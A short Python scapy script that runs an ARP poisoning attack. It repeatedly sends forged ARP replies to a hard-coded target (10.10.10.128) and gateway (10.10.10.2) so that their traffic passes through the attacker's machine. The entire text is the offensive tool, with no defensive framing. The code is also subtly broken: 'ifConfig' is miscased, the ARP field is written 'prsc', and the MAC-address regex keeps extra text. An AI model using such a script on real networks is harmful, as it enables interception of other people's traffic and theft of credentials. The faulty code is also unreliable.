from scapy.all import *
import subprocess
import re
import time

target_ip = "10.10.10.128"
gateway_ip = "10.10.10.2"

ifConfigResult = subprocess.check_output("ifConfig eth0",shell=True).decode()
attacker_mac = re.search("ether(.*?)txqueuelen",ifConfigResult).group().strip()

eth = Ether(src=attacker_mac)
h_arp = ARP(hwsrc=attacker_mac,prsc=gateway_ip,pdst=target_ip)
g_arp = ARP(hwsrc=attacker_mac,prsc=target_ip,pdst=gateway_ip)

print("Arp poising  Attack is  Starting ...")

while True:
    try:
        sendp(eth/h_arp)
        sendp(eth/g_arp)
    except KeyboardInterrupt:
        print("ARP Poising is stoped !!")
        break
    time.sleep(1)




